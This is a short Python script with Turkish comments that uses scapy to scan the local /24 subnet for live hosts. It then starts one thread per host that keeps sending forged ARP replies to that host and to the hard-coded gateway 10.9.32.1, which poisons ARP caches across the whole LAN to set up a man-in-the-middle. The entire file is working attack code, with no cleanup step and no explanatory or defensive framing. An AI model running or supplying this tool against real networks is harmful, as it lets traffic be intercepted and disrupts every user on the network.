from scapy.all import ARP, Ether, send, srp
import threading
import time
import netifaces

interface = "enp0s3"
gateway_ip = "10.9.32.1"

# Kendi IP adresini al
def get_own_ip(interface):
    try:
        return netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
    except (KeyError, IndexError):
        return None

own_ip = get_own_ip(interface)
if not own_ip:
    print("[!] Kendi IP alınamadı.")
    exit(1)
print(f"[*] Kendi IP: {own_ip}")

# Ağdaki cihazları bul
def get_active_ips():
    print("[*] Ağ taranıyor...")
    ip_range = ".".join(own_ip.split('.')[:3]) + ".1/24"
    arp_request = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request
    answered = srp(packet, timeout=2, iface=interface, verbose=0)[0]

    devices = []
    for _, recv in answered:
        ip = recv.psrc
        if ip != own_ip and ip != gateway_ip:
            devices.append(ip)

    print(f"[*] Bulunan IP'ler: {devices}")
    return devices

# ARP spoof işlemi
def spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip)
    send(packet, verbose=0)

# Hedef için sürekli spoofing
def spoof_loop(target_ip):
    print(f"[*] {target_ip} hedefleniyor...")
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        time.sleep(2)

# Cihazları bul ve thread başlat
targets = get_active_ips()
threads = []

for ip in targets:
    thread = threading.Thread(target=spoof_loop, args=(ip,))
    thread.daemon = True  # Program kapanınca threadler de kapanır
    thread.start()
    threads.append(thread)

# Ana thread sonsuza kadar çalışsın
while True:
    try:
        time.sleep(5)
    except KeyboardInterrupt:
        print("\n[!] İşlem iptal edildi.")
        break